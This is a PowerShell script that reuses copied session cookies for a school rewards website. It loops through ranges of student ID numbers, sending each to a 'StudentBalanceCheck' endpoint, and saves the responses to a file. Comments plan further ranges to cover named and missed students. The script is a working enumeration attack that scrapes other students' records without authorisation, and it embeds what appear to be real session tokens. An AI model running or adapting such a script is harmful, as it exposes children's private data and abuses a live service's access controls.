cd E:\noice
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$session.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
$session.Cookies.Add((New-Object System.Net.Cookie("PHPSESSID", "1khlovntj7v4e95qcvpvp6nsqg", "/", "student.pbisrewards.com")))
$session.Cookies.Add((New-Object System.Net.Cookie("__utmc", "101992643", "/", ".student.pbisrewards.com")))
$session.Cookies.Add((New-Object System.Net.Cookie("__utmz", "101992643.1636854369.2.2.utmcsr=clever.com|utmccn=(referral)|utmcmd=referral|utmcct=/", "/", ".student.pbisrewards.com")))
$session.Cookies.Add((New-Object System.Net.Cookie("G_ENABLED_IDPS", "google", "/", ".student.pbisrewards.com")))
$session.Cookies.Add((New-Object System.Net.Cookie("__utma", "101992643.1692497892.1633473367.1636854369.1636857911.3", "/", ".student.pbisrewards.com")))
$session.Cookies.Add((New-Object System.Net.Cookie("__utmb", "101992643.2.9.1636859000577", "/", ".student.pbisrewards.com")))
$session.Cookies.Add((New-Object System.Net.Cookie("AWSALB", "9Rx1srS9gkSsgQg4WUHItzMMdA4A2cjw5NUe2RLMd07CFk+E3iClnTDKjh/ms0GB98aul/BDPiLgfKEVPP36srsPEWeJgwFGfbjJz5RTHpex4FEIlPsFjCLY8PzK", "/", "student.pbisrewards.com")))
$session.Cookies.Add((New-Object System.Net.Cookie("AWSALBCORS", "9Rx1srS9gkSsgQg4WUHItzMMdA4A2cjw5NUe2RLMd07CFk+E3iClnTDKjh/ms0GB98aul/BDPiLgfKEVPP36srsPEWeJgwFGfbjJz5RTHpex4FEIlPsFjCLY8PzK", "/", "student.pbisrewards.com")))


#may redo 13000000 from 27500 to 35000 since passes go to 27500 and near and redo 14000000 for justyna and for anyone else i missed
14017348..14027500 | % { (Invoke-WebRequest -UseBasicParsing -Uri "https://student.pbisrewards.com/mobile/appgateway.php" `
-Method "POST" `
-WebSession $session `
-Headers @{
"method"="POST"
  "authority"="student.pbisrewards.com"
  "scheme"="https"
  "path"="/mobile/appgateway.php"
  "sec-ch-ua"="`"Google Chrome`";v=`"95`", `"Chromium`";v=`"95`", `";Not A Brand`";v=`"99`""
  "form-token"=""
  "sec-ch-ua-mobile"="?0"
  "accept"="application/json, text/javascript, */*; q=0.01"
  "dnt"="1"
  "sec-ch-ua-platform"="`"Windows`""
  "sec-gpc"="1"
  "origin"="https://student.pbisrewards.com"
  "sec-fetch-site"="same-origin"
  "sec-fetch-mode"="cors"
  "sec-fetch-dest"="empty"
  "referer"="https://student.pbisrewards.com/student.php?BrowserChosen=1"
  "accept-encoding"="gzip, deflate, br"
  "accept-language"="en-US,en;q=0.9,es-US;q=0.8,es;q=0.7"
} `
-ContentType "application/x-www-form-urlencoded; charset=UTF-8" `
-Body "TODO=StudentBalanceCheck&FROM=Web&ClassClever=1&SchoolCode=2841&ScannedData=52$_&AuthID=").content | Add-Content -Path pshel.txt }

#10278035
#11035000